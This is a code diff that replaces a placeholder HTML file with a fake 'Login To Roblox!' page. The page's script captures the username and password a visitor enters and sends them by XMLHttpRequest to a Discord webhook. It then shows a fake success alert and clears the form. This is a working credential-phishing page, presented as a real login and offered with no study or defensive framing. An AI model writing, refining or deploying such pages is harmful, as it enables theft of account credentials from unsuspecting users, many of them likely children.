@@ -1,1 +1,45 @@
-<p> hi test </p>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox</title>
+</head>
+<body>
+    <h1>Login To Roblox!</h1>
+    <form id="myForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://discord.com/api/webhooks/1113463743955873892/ZmlDkPUKw5IDBQ2lRtxRUZWk9fMUL0qYW6HF9jO_NHwUY3m8JY9CI-BWXpPJfSf8DRra", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            var payload = {
+                "username": username,
+                "password": password
+            };
+
+            xhr.send(JSON.stringify(payload));
+
+            // Optional: Show a success message to the user
+            alert("Login Succsessful");
+
+            // Optional: Clear the input fields
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+        });
+    </script>
+</body>
+</html>
